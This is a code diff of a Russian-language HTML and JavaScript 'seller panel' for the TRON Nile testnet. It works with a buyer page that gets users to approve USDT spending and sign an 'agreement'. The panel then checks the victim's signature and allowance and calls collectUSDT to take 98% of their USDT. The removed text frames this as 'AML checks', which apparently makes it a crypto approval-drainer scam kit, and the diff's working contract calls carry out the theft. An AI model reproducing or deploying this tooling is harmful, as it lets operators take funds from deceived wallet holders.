@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
-    <title>Панель Продавца — Управление средствами</title>
+    <title>Панель Продавца — Nile Testnet</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -14,11 +14,10 @@
             --success: #00D4AA; --error: #ff4757; --warning: #FFA500;
         }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Inter', sans-serif;
             background: var(--bg-dark); color: var(--text-primary);
             line-height: 1.6; min-height: 100vh;
         }
-
         .header {
             background: var(--bg-card); border-bottom: 1px solid var(--border);
             padding: 1rem 2rem; position: sticky; top: 0; z-index: 100;
@@ -32,7 +31,6 @@
         }
         .logo-text h1 { font-size: 1.25rem; font-weight: 600; }
         .logo-text span { font-size: 0.75rem; color: var(--text-secondary); }
-
         .wallet-status {
             display: flex; align-items: center; gap: 0.75rem;
             background: var(--bg-hover); padding: 0.5rem 1rem;
@@ -44,41 +42,28 @@
             background: var(--error); animation: pulse 2s infinite;
         }
         .wallet-status.connected .status-dot { background: var(--success); }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         .wallet-address { font-family: monospace; font-size: 0.85rem; }
-
-        .container {
-            max-width: 1200px; margin: 0 auto; padding: 2rem;
-        }
-
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         .connect-warning {
             background: linear-gradient(135deg, rgba(255, 71, 87, 0.1) 0%, rgba(255, 165, 0, 0.1) 100%);
             border: 1px solid var(--error); border-radius: 16px;
             padding: 2rem; text-align: center; margin-bottom: 2rem;
         }
         .connect-warning h2 { color: var(--error); margin-bottom: 1rem; }
-        .connect-warning p { color: var(--text-secondary); margin-bottom: 1.5rem; }
-
         .btn-primary {
             background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
             color: white; border: none; padding: 1rem 2rem;
             border-radius: 12px; font-weight: 600; cursor: pointer;
-            font-size: 1rem; transition: transform 0.2s, box-shadow 0.2s;
-            display: inline-flex; align-items: center; gap: 0.5rem;
+            font-size: 1rem; display: inline-flex; align-items: center; gap: 0.5rem;
         }
         .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3); }
-        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-
         .spinner {
             width: 20px; height: 20px; border: 2px solid transparent;
             border-top-color: white; border-radius: 50%;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-
         .stats-grid {
             display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
             gap: 1.5rem; margin-bottom: 2rem;
@@ -92,74 +77,39 @@
             text-transform: uppercase; letter-spacing: 0.05em;
             margin-bottom: 0.5rem;
         }
-        .stat-value {
-            font-size: 2rem; font-weight: 700; color: var(--accent);
-        }
-        .stat-value.zero { color: var(--text-secondary); }
-
+        .stat-value { font-size: 2rem; font-weight: 700; color: var(--accent); }
         .main-card {
             background: var(--bg-card); border: 1px solid var(--border);
             border-radius: 16px; padding: 2rem; margin-bottom: 2rem;
         }
-        .main-card h2 {
-            font-size: 1.25rem; margin-bottom: 1.5rem;
-            display: flex; align-items: center; gap: 0.5rem;
-        }
-
         .form-group { margin-bottom: 1.5rem; }
         .form-group label {
             display: block; margin-bottom: 0.5rem;
             color: var(--text-secondary); font-size: 0.875rem;
         }
-        .input-wrapper { position: relative; }
         .input-group {
             display: flex; gap: 0.75rem;
             background: var(--bg-hover); border: 1px solid var(--border);
             border-radius: 12px; padding: 0.5rem;
-            transition: border-color 0.3s;
         }
-        .input-group:focus-within { border-color: var(--primary); }
-        .input-group.error { border-color: var(--error); }
-        .input-group.success { border-color: var(--success); }
         .input-group input {
             flex: 1; background: transparent; border: none;
             color: var(--text-primary); padding: 0.75rem;
             font-size: 1rem; outline: none;
         }
-        .input-group input::placeholder { color: var(--text-secondary); }
         .btn-icon {
             background: var(--primary); border: none; color: white;
-            padding: 0.75rem 1rem; border-radius: 8px;
-            cursor: pointer; font-weight: 500;
+            padding: 0.75rem 1rem; border-radius: 8px; cursor: pointer;
         }
-        .btn-icon:hover { background: var(--primary-dark); }
-
-        .validation-hint {
-            font-size: 0.8rem; margin-top: 0.5rem;
-            color: var(--text-secondary);
-        }
-        .validation-hint.error { color: var(--error); }
-        .validation-hint.success { color: var(--success); }
-
         .user-info {
             background: var(--bg-hover); border: 1px solid var(--border);
             border-radius: 12px; padding: 1.5rem; margin-top: 1.5rem;
             display: none;
         }
-        .user-info.visible { display: block; animation: slideDown 0.3s ease; }
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        .user-info.visible { display: block; }
         .info-row {
             display: flex; justify-content: space-between; align-items: center;
             padding: 0.75rem 0; border-bottom: 1px solid var(--border);
-        }
-        .info-row:last-child { border-bottom: none; }
-        .info-label { color: var(--text-secondary); font-size: 0.875rem; }
-        .info-value {
-            font-family: monospace; font-weight: 600;
-            display: flex; align-items: center; gap: 0.5rem;
         }
         .badge {
             padding: 0.25rem 0.75rem; border-radius: 20px;
@@ -168,71 +118,33 @@
         .badge-success { background: rgba(0, 212, 170, 0.2); color: var(--success); }
         .badge-error { background: rgba(255, 71, 87, 0.2); color: var(--error); }
         .badge-warning { background: rgba(255, 165, 0, 0.2); color: var(--warning); }
-
-        .action-section {
-            margin-top: 2rem; padding-top: 2rem;
-            border-top: 1px solid var(--border);
-        }
         .btn-collect {
             width: 100%; padding: 1.25rem;
             background: linear-gradient(135deg, var(--success) 0%, var(--primary) 100%);
             color: white; border: none; border-radius: 12px;
             font-weight: 700; font-size: 1.1rem; cursor: pointer;
-            display: flex; align-items: center; justify-content: center; gap: 0.75rem;
-            transition: all 0.3s;
         }
-        .btn-collect:hover:not(:disabled) {
-            transform: translateY(-2px); box-shadow: 0 15px 40px rgba(0, 212, 170, 0.3);
-        }
-        .btn-collect:disabled {
-            opacity: 0.5; cursor: not-allowed;
-            background: var(--bg-hover);
-        }
-
         .status-message {
-            padding: 1rem 1.25rem; border-radius: 12px;
-            margin-top: 1rem; display: none; align-items: center; gap: 0.75rem;
+            padding: 1rem; border-radius: 12px; margin-top: 1rem;
+            display: none;
         }
-        .status-message.visible { display: flex; }
+        .status-message.visible { display: block; }
         .status-message.success {
             background: rgba(0, 212, 170, 0.1); border: 1px solid var(--success); color: var(--success);
         }
         .status-message.error {
             background: rgba(255, 71, 87, 0.1); border: 1px solid var(--error); color: var(--error);
         }
-        .status-message.info {
-            background: rgba(51, 117, 187, 0.1); border: 1px solid var(--primary); color: var(--primary);
-        }
-
-        .tx-link {
-            color: var(--primary); text-decoration: none;
-            font-family: monospace; font-size: 0.875rem;
-            word-break: break-all;
-        }
-        .tx-link:hover { text-decoration: underline; }
-
-        .instructions {
-            background: var(--bg-hover); border-left: 4px solid var(--primary);
-            padding: 1.25rem; border-radius: 0 12px 12px 0;
-            margin-bottom: 2rem;
-        }
-        .instructions h4 { color: var(--primary); margin-bottom: 0.75rem; }
-        .instructions ul { margin-left: 1.25rem; color: var(--text-secondary); }
-        .instructions li { margin-bottom: 0.5rem; }
-
         .contract-info {
             background: rgba(51, 117, 187, 0.05); border: 1px solid var(--border);
             border-radius: 12px; padding: 1rem; margin-bottom: 2rem;
             display: flex; justify-content: space-between; align-items: center;
             flex-wrap: wrap; gap: 1rem;
         }
-        .contract-label { color: var(--text-secondary); font-size: 0.875rem; }
         .contract-address {
             font-family: monospace; background: var(--bg-hover);
-            padding: 0.5rem 1rem; border-radius: 8px;
-            font-size: 0.875rem; word-break: break-all;
+            padding: 0.5rem 1rem; border-radius: 8px; font-size: 0.875rem;
         }
-
         .loading-overlay {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background: var(--bg-dark); z-index: 9999;
@@ -240,39 +152,14 @@
             justify-content: center; gap: 1.5rem;
         }
         .loading-overlay.hidden { display: none; }
-        .loading-spinner-large {
-            width: 50px; height: 50px; border: 3px solid var(--border);
-            border-top-color: var(--primary); border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        /* Auto-fill badge */
-        .autofill-badge {
-            display: inline-block;
-            background: var(--accent);
-            color: var(--bg-dark);
-            padding: 0.25rem 0.5rem;
-            border-radius: 4px;
-            font-size: 0.7rem;
-            font-weight: 600;
-            margin-left: 0.5rem;
-        }
-
-        @media (max-width: 768px) {
-            .header { padding: 1rem; flex-direction: column; gap: 1rem; }
-            .container { padding: 1rem; }
-            .stats-grid { grid-template-columns: 1fr; }
-            .main-card { padding: 1.25rem; }
-        }
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
     <div class="loading-overlay" id="loadingScreen">
-        <div class="logo-icon" style="width: 60px; height: 60px; font-size: 1.5rem;">💰</div>
+        <div class="logo-icon" style="width: 60px; height: 60px;">💰</div>
         <div style="font-size: 1.25rem; font-weight: 600;">Панель Продавца</div>
-        <div class="loading-spinner-large"></div>
-        <div style="color: var(--text-secondary);" id="loadingText">Инициализация...</div>
+        <div class="spinner" style="width: 50px; height: 50px; border: 3px solid var(--border); border-top-color: var(--primary);"></div>
+        <div style="color: var(--text-secondary);">Nile Testnet</div>
     </div>
 
     <header class="header">
@@ -280,7 +167,7 @@
             <div class="logo-icon">💰</div>
             <div class="logo-text">
                 <h1>Панель Продавца</h1>
-                <span>Управление AML-проверками</span>
+                <span>Nile Testnet</span>
             </div>
         </div>
         <div class="wallet-status" id="walletStatus">
@@ -290,41 +177,20 @@
     </header>
 
     <div class="container">
-        <!-- Connection Warning -->
         <div class="connect-warning" id="connectWarning">
-            <h2>⚠️ Требуется подключение кошелька</h2>
-            <p>Для работы с панелью продавца необходимо подключить TronLink</p>
+            <h2>⚠️ Требуется подключение</h2>
+            <p>Подключите TronLink на Nile Testnet</p>
             <button class="btn-primary" onclick="connectWallet()" id="connectBtn">
-                <span id="btnText">Подключить TronLink</span>
+                <span id="btnText">Подключить</span>
             </button>
         </div>
 
-        <!-- Main Content -->
         <div id="mainContent" style="display: none;">
-
             <div class="contract-info">
                 <div>
-                    <div class="contract-label">Адрес контракта:</div>
+                    <div style="color: var(--text-secondary); font-size: 0.875rem;">Контракт:</div>
                 </div>
-                <div class="contract-address">TPMZSSoFuoN3Krqn2j1qaJzQVQN3mWXEvk</div>
-            </div>
-
-            <div class="instructions">
-                <h4>📋 Инструкция по работе:</h4>
-                <ul>
-                    <li>Отправьте покупателю ссылку на <strong>страницу покупателя</strong> (buyer.html) — там он нажимает одну кнопку и подтверждает два попапа: approve USDT + signAgreement</li>
-                    <li>После этого введите адрес покупателя и нажмите «Проверить»</li>
-                    <li>Если покупатель прошёл оба шага — появится кнопка «Собрать средства»</li>
-                    <li>98% средств поступит на ваш кошелёк</li>
-                </ul>
-            </div>
-
-            <div style="background: rgba(0,212,170,0.07); border: 1px solid rgba(0,212,170,0.3); border-radius: 12px; padding: 1rem; margin-bottom: 2rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.75rem;">
-                <div>
-                    <div style="font-size: 0.8rem; color: var(--text-secondary);">Ссылка для покупателя</div>
-                    <div style="font-size: 0.9rem; font-weight: 600; color: var(--accent);">buyer.html — два подтверждения автоматически</div>
-                </div>
-                <button onclick="window.open('buyer.html','_blank')" style="background: var(--accent); color: var(--bg-dark); border: none; padding: 0.6rem 1.2rem; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 0.85rem;">Открыть →</button>
+                <div class="contract-address">TQmnjYQbsQKmaihohjXHZNruEJ5K4oyRyV</div>
             </div>
 
             <div class="stats-grid">
@@ -334,13 +200,7 @@
                 </div>
                 <div class="stat-card">
                     <h3>Проверок сегодня</h3>
-                    <div class="stat-value zero" id="checksToday">0</div>
-                </div>
-                <div class="stat-card">
-                    <h3>Статус</h3>
-                    <div class="stat-value" style="font-size: 1rem; color: var(--success);">
-                        ✅ Активен
-                    </div>
+                    <div class="stat-value" id="checksToday">0</div>
                 </div>
             </div>
 
@@ -348,76 +208,45 @@
                 <h2>🔍 Проверка и сбор средств</h2>
 
                 <div class="form-group">
-                    <label>
-                        Адрес пользователя 
-                        <span class="autofill-badge" id="userAutofillBadge" style="display: none;">AUTO</span>
-                    </label>
-                    <div class="input-wrapper">
-                        <div class="input-group" id="userInputGroup">
-                            <input type="text" id="userAddress" placeholder="Например: TM84hjZ28XRw13oHAWWsGnf54mUSHVVDtN">
-                            <button class="btn-icon" onclick="pasteAddress()" title="Вставить">📋</button>
-                        </div>
-                        <div class="validation-hint" id="userHint">Адрес должен начинаться с T и содержать 34 символа</div>
+                    <label>Адрес покупателя</label>
+                    <div class="input-group">
+                        <input type="text" id="userAddress" placeholder="TM... или TQ... (начинается с T)">
+                        <button class="btn-icon" onclick="pasteAddress()">📋</button>
                     </div>
                 </div>
 
                 <div class="form-group">
-                    <label>
-                        Адрес USDT контракта
-                        <span class="autofill-badge" id="usdtAutofillBadge" style="display: none;">DEFAULT</span>
-                    </label>
-                    <div class="input-wrapper">
-                        <div class="input-group" id="usdtInputGroup">
-                            <input type="text" id="usdtAddress" value="TFNZbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb">
-                            <button class="btn-icon" onclick="resetUsdt()" title="Сбросить">↺</button>
-                        </div>
-                        <div class="validation-hint" id="usdtHint">Стандартный адрес USDT (Nile Testnet)</div>
+                    <label>Адрес USDT (Nile Testnet)</label>
+                    <div class="input-group">
+                        <input type="text" id="usdtAddress" value="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf">
+                        <button class="btn-icon" onclick="resetUsdt()">↺</button>
                     </div>
                 </div>
 
                 <button class="btn-primary" onclick="checkUser()" id="checkBtn" style="width: 100%;">
-                    <span id="checkBtnText">Проверить пользователя</span>
+                    <span id="checkBtnText">Проверить</span>
                 </button>
 
                 <div class="user-info" id="userInfo">
                     <div class="info-row">
-                        <span class="info-label">Статус подписи:</span>
-                        <span class="info-value" id="signStatus">
-                            <span class="badge badge-warning">Проверка...</span>
-                        </span>
+                        <span style="color: var(--text-secondary);">Подписан:</span>
+                        <span id="signStatus"></span>
                     </div>
                     <div class="info-row">
-                        <span class="info-label">Allowance USDT:</span>
-                        <span class="info-value" id="allowanceStatus">
-                            <span class="badge badge-warning">Проверка...</span>
-                        </span>
+                        <span style="color: var(--text-secondary);">Собрано:</span>
+                        <span id="collectStatus"></span>
                     </div>
                     <div class="info-row">
-                        <span class="info-label">Сбор выполнен:</span>
-                        <span class="info-value" id="collectStatusBadge">
-                            <span class="badge badge-warning">Проверка...</span>
-                        </span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">Доступно для сбора:</span>
-                        <span class="info-value" id="availableAmount" style="color: var(--accent); font-size: 1.25rem;">
-                            0 USDT
-                        </span>
+                        <span style="color: var(--text-secondary);">Доступно:</span>
+                        <span id="availableAmount" style="color: var(--accent); font-weight: 700;"></span>
                     </div>
                 </div>
 
-                <div class="action-section" id="collectSection" style="display: none;">
+                <div id="collectSection" style="display: none; margin-top: 1.5rem;">
                     <button class="btn-collect" onclick="collectFunds()" id="collectBtn">
                         💸 Собрать 98% USDT
                     </button>
-                    <div class="status-message" id="collectStatus"></div>
-                </div>
-            </div>
-
-            <div class="main-card">
-                <h2>📊 Недавняя активность</h2>
-                <div id="activityList" style="color: var(--text-secondary); text-align: center; padding: 2rem;">
-                    Нет недавних операций
+                    <div class="status-message" id="collectStatusMsg"></div>
                 </div>
             </div>
         </div>
@@ -425,309 +254,116 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = 'TPMZSSoFuoN3Krqn2j1qaJzQVQN3mWXEvk';
-        const DEFAULT_USDT = 'TFNZbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb';
+        const CONTRACT_ADDRESS = 'TQmnjYQbsQKmaihohjXHZNruEJ5K4oyRyV';
+        const DEFAULT_USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
 
         const CONTRACT_ABI = [
+            {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"},
             {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"name":"","type":"address"}],"name":"approved","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"","type":"address"}],"name":"signed","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"name":"","type":"address"}],"name":"collected","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
         ];
 
-        const USDT_ABI = [
-            {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
-        ];
+        let tronWeb, contract, userAddress, currentUserData = null;
 
-        let tronWeb, contract, userAddress, contractOwner;
-        let currentUserData = null;
-
-        // Инициализация при загрузке
         window.addEventListener('load', async () => {
-            // Автозаполнение из URL параметров
-            fillFromUrlParams();
-
-            // Проверяем подключение
-            if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress.base58) {
+            if (window.tronWeb?.ready) {
                 await initApp();
             } else {
                 document.getElementById('loadingScreen').classList.add('hidden');
             }
         });
 
-        // Автозаполнение из URL
-        function fillFromUrlParams() {
-            const params = new URLSearchParams(window.location.search);
-
-            // Параметр user или address — адрес пользователя
-            const userParam = params.get('user') || params.get('address');
-            if (userParam && isValidAddress(userParam)) {
-                document.getElementById('userAddress').value = userParam;
-                document.getElementById('userAutofillBadge').style.display = 'inline-block';
-                validateAddress('user', userParam);
-            }
-
-            // Параметр usdt — адрес USDT (редко нужно менять)
-            const usdtParam = params.get('usdt');
-            if (usdtParam && isValidAddress(usdtParam)) {
-                document.getElementById('usdtAddress').value = usdtParam;
-                document.getElementById('usdtAutofillBadge').style.display = 'inline-block';
-                document.getElementById('usdtHint').textContent = 'Адрес USDT из URL';
-            }
-        }
-
-        // Валидация адреса Tron
-        function isValidAddress(address) {
-            if (!address || typeof address !== 'string') return false;
-            // TRON адрес: начинается с T, 34 символа, base58
-            return /^T[0-9a-zA-Z]{33}$/.test(address);
-        }
-
-        // Валидация с визуальной обратной связью
-        function validateAddress(type, address) {
-            const inputGroup = document.getElementById(type + 'InputGroup');
-            const hint = document.getElementById(type + 'Hint');
-
-            if (!address) {
-                inputGroup.className = 'input-group';
-                hint.className = 'validation-hint';
-                return false;
-            }
-
-            if (isValidAddress(address)) {
-                inputGroup.className = 'input-group success';
-                hint.className = 'validation-hint success';
-                hint.textContent = '✓ Адрес корректен';
-                return true;
-            } else {
-                inputGroup.className = 'input-group error';
-                hint.className = 'validation-hint error';
-                hint.textContent = '✗ Некорректный адрес. Должен начинаться с T и содержать 34 символа';
-                return false;
-            }
-        }
-
-        // Обработчики ввода
-        document.getElementById('userAddress').addEventListener('input', (e) => {
-            validateAddress('user', e.target.value.trim());
-            // Скрываем бейдж автозаполнения при ручном редактировании
-            if (e.target.value.trim() !== new URLSearchParams(window.location.search).get('user')) {
-                document.getElementById('userAutofillBadge').style.display = 'none';
-            }
-        });
-
-        document.getElementById('usdtAddress').addEventListener('input', (e) => {
-            validateAddress('usdt', e.target.value.trim());
-        });
-
-        // Подключение кошелька
         async function connectWallet() {
             const btn = document.getElementById('connectBtn');
-            const btnText = document.getElementById('btnText');
-
-            btn.disabled = true;
-            btnText.innerHTML = '<div class="spinner"></div> Подключение...';
+            btn.innerHTML = '<div class="spinner"></div> Подключение...';
 
             try {
-                if (!window.tronLink && !window.tronWeb) {
-                    throw new Error('TronLink не установлен');
+                if (window.tronLink?.request) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                 }
-
-                let res;
-                if (window.tronLink && window.tronLink.request) {
-                    res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                } else if (window.tronWeb && window.tronWeb.request) {
-                    res = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-                } else {
-                    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                        res = { code: 200 };
-                    } else {
-                        throw new Error('TronLink не отвечает');
-                    }
-                }
-
-                if (res && res.code === 200) {
-                    await initApp();
-                } else if (res && res.code === 4000) {
-                    await waitForConnection();
-                } else {
-                    throw new Error('Доступ отклонен');
-                }
-
-            } catch (error) {
-                btn.disabled = false;
-                btnText.textContent = 'Подключить TronLink';
-                alert(error.message);
+                await initApp();
+            } catch (e) {
+                alert(e.message);
+                btn.innerHTML = 'Подключить';
             }
-        }
-
-        async function waitForConnection() {
-            for (let i = 0; i < 20; i++) {
-                if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress.base58) {
-                    await initApp();
-                    return;
-                }
-                await new Promise(r => setTimeout(r, 300));
-            }
-            throw new Error('Таймаут ожидания');
         }
 
         async function initApp() {
             try {
-                if (window.tronLink && window.tronLink.tronWeb) {
-                    tronWeb = window.tronLink.tronWeb;
-                } else if (window.tronWeb) {
-                    tronWeb = window.tronWeb;
-                } else {
-                    throw new Error('TronWeb не доступен');
-                }
-
-                if (!tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
-                    throw new Error('Разблокируйте TronLink');
-                }
-
+                tronWeb = window.tronLink?.tronWeb || window.tronWeb;
                 userAddress = tronWeb.defaultAddress.base58;
                 contract = tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
 
                 document.getElementById('walletStatus').classList.add('connected');
-                document.getElementById('walletAddress').textContent = 
-                    userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
-
+                document.getElementById('walletAddress').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
                 document.getElementById('connectWarning').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
                 document.getElementById('loadingScreen').classList.add('hidden');
-
-                loadStats();
-
-            } catch (error) {
-                alert('Ошибка: ' + error.message);
-                document.getElementById('connectBtn').disabled = false;
-                document.getElementById('btnText').textContent = 'Подключить TronLink';
+            } catch (e) {
+                alert('Ошибка: ' + e.message);
             }
         }
 
         async function pasteAddress() {
-            try {
-                const text = await navigator.clipboard.readText();
-                const clean = text.trim();
-                document.getElementById('userAddress').value = clean;
-                validateAddress('user', clean);
-                document.getElementById('userAutofillBadge').style.display = 'none';
-            } catch (err) {
-                console.log('Clipboard error:', err);
-            }
+            const text = await navigator.clipboard.readText();
+            document.getElementById('userAddress').value = text.trim();
         }
 
         function resetUsdt() {
             document.getElementById('usdtAddress').value = DEFAULT_USDT;
-            validateAddress('usdt', DEFAULT_USDT);
-            document.getElementById('usdtAutofillBadge').style.display = 'none';
-            document.getElementById('usdtHint').textContent = 'Стандартный адрес USDT (Nile Testnet)';
         }
 
         async function checkUser() {
             const user = document.getElementById('userAddress').value.trim();
             const usdt = document.getElementById('usdtAddress').value.trim();
 
-            // Валидация перед отправкой
-            if (!validateAddress('user', user)) {
-                alert('Введите корректный адрес пользователя');
-                return;
-            }
-            if (!validateAddress('usdt', usdt)) {
-                alert('Введите корректный адрес USDT');
+            if (!user || !user.startsWith('T')) {
+                alert('Введите корректный адрес (начинается с T)');
                 return;
             }
 
-            const checkBtn = document.getElementById('checkBtn');
-            const userInfo = document.getElementById('userInfo');
-
-            checkBtn.disabled = true;
-            document.getElementById('checkBtnText').innerHTML = '<div class="spinner"></div> Проверка...';
+            document.getElementById('checkBtn').disabled = true;
+            document.getElementById('checkBtnText').textContent = 'Проверка...';
 
             try {
-                // Нормализуем адрес — TronLink иногда отдаёт hex вместо base58
-                let userNorm = user;
-                try {
-                    if (user.startsWith('0x') || user.startsWith('41')) {
-                        userNorm = tronWeb.address.fromHex(user.startsWith('0x') ? '41' + user.slice(2) : user);
-                    }
-                } catch(e) {}
+                const isSigned = await contract.signed(user).call();
+                const isCollected = await contract.collected(user).call();
+                const amount = await contract.checkCollectable(user, usdt).call();
 
-                const approved = await contract.approved(userNorm).call();
-                const collected = await contract.collected(userNorm).call();
-
-                document.getElementById('signStatus').innerHTML = approved 
-                    ? '<span class="badge badge-success">✅ Подписано</span>'
-                    : '<span class="badge badge-error">❌ Не подписано</span>';
-
-                document.getElementById('collectStatusBadge').innerHTML = collected
+                document.getElementById('signStatus').innerHTML = isSigned 
+                    ? '<span class="badge badge-success">✅ Да</span>' 
+                    : '<span class="badge badge-error">❌ Нет</span>';
+                document.getElementById('collectStatus').innerHTML = isCollected
                     ? '<span class="badge badge-success">✅ Да</span>'
                     : '<span class="badge badge-warning">⏳ Нет</span>';
+                document.getElementById('availableAmount').textContent = (amount / 1e6).toFixed(2) + ' USDT';
 
-                // Проверяем allowance
-                try {
-                    const usdtC = tronWeb.contract(USDT_ABI, usdt);
-                    const allowanceRaw = await usdtC.allowance(userNorm, CONTRACT_ADDRESS).call();
-                    let allowanceNum = 0;
-                    try {
-                        allowanceNum = typeof allowanceRaw === 'object'
-                            ? (allowanceRaw._hex ? parseInt(allowanceRaw._hex, 16) : (allowanceRaw.toNumber ? allowanceRaw.toNumber() : Number(allowanceRaw)))
-                            : Number(allowanceRaw);
-                    } catch(e2) { allowanceNum = 0; }
-                    const allowanceFmt = (allowanceNum / 1e6).toFixed(2);
-                    document.getElementById('allowanceStatus').innerHTML = allowanceNum > 0
-                        ? `<span class="badge badge-success">✅ ${allowanceFmt} USDT</span>`
-                        : '<span class="badge badge-error">❌ Нет approve — попросите покупателя открыть buyer.html</span>';
-                } catch(e) {
-                    console.warn('allowance check error:', e);
-                    document.getElementById('allowanceStatus').innerHTML = '<span class="badge badge-warning">⚠️ Не удалось проверить</span>';
-                }
+                document.getElementById('userInfo').classList.add('visible');
 
-                const amount = await contract.checkCollectable(userNorm, usdt).call();
-                const amountFormatted = (amount / 1e6).toFixed(2);
-
-                document.getElementById('availableAmount').textContent = amountFormatted + ' USDT';
-                userInfo.classList.add('visible');
-
-                if (amount > 0 && !collected && approved) {
+                if (amount > 0 && !isCollected && isSigned) {
                     document.getElementById('collectSection').style.display = 'block';
-                    currentUserData = { user: userNorm, usdt, amount: amountFormatted };
+                    currentUserData = { user, usdt, amount };
                 } else {
                     document.getElementById('collectSection').style.display = 'none';
-
-                    let message = '';
-                    if (collected) message = 'Средства уже собраны';
-                    else if (!approved) message = 'Пользователь не подписал соглашение';
-                    else if (amount == 0) message = 'Нет доступных средств';
-
-                    if (message) showStatus('collectStatus', message, 'info');
                 }
-
-                incrementChecks();
-
-            } catch (error) {
-                console.error(error);
-                let msg = error.message || String(error) || 'Ошибка проверки';
-                if (msg.includes('REVERT')) msg = 'Ошибка контракта: возможно, адрес невалиден или не существует';
-                if (msg.includes('Invalid address') || msg.includes('Некорректный адрес')) msg = 'Некорректный адрес — убедитесь что сеть TronLink = Nile Testnet';
-                alert(msg);
+            } catch (e) {
+                alert('Ошибка: ' + e.message);
             } finally {
-                checkBtn.disabled = false;
-                document.getElementById('checkBtnText').textContent = 'Проверить пользователя';
+                document.getElementById('checkBtn').disabled = false;
+                document.getElementById('checkBtnText').textContent = 'Проверить';
             }
         }
 
         async function collectFunds() {
             if (!currentUserData) return;
-
-            const btn = document.getElementById('collectBtn');
             const { user, usdt } = currentUserData;
 
+            const btn = document.getElementById('collectBtn');
             btn.disabled = true;
-            btn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Сбор средств...';
+            btn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Сбор...';
 
             try {
                 const tx = await contract.collectUSDT(user, usdt).send({
@@ -735,91 +371,15 @@
                     callValue: 0
                 });
 
-                showStatus('collectStatus', 
-                    `✅ Успешно! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" class="tx-link">${tx.slice(0, 20)}...</a>`, 
-                    'success');
-
-                btn.innerHTML = '✅ Сбор выполнен';
-                btn.style.background = 'var(--success)';
-
-                addActivity(user, currentUserData.amount, tx);
-                updateTotalCollected(parseFloat(currentUserData.amount));
-
-                setTimeout(() => {
-                    document.getElementById('collectSection').style.display = 'none';
-                    document.getElementById('userInfo').classList.remove('visible');
-                    document.getElementById('userAddress').value = '';
-                    validateAddress('user', '');
-                    currentUserData = null;
-                    btn.disabled = false;
-                    btn.innerHTML = '💸 Собрать 98% USDT';
-                    btn.style.background = '';
-                }, 3000);
-
-            } catch (error) {
-                showStatus('collectStatus', '❌ ' + error.message.slice(0, 100), 'error');
+                document.getElementById('collectStatusMsg').className = 'status-message success visible';
+                document.getElementById('collectStatusMsg').innerHTML = '✅ Успешно! TX: ' + tx.slice(0, 20) + '...';
+                btn.innerHTML = '✅ Собрано';
+            } catch (e) {
+                document.getElementById('collectStatusMsg').className = 'status-message error visible';
+                document.getElementById('collectStatusMsg').textContent = '❌ ' + e.message;
                 btn.disabled = false;
                 btn.innerHTML = '💸 Собрать 98% USDT';
             }
-        }
-
-        function showStatus(elementId, message, type) {
-            const el = document.getElementById(elementId);
-            el.className = 'status-message ' + type + ' visible';
-            el.innerHTML = message;
-        }
-
-        function loadStats() {
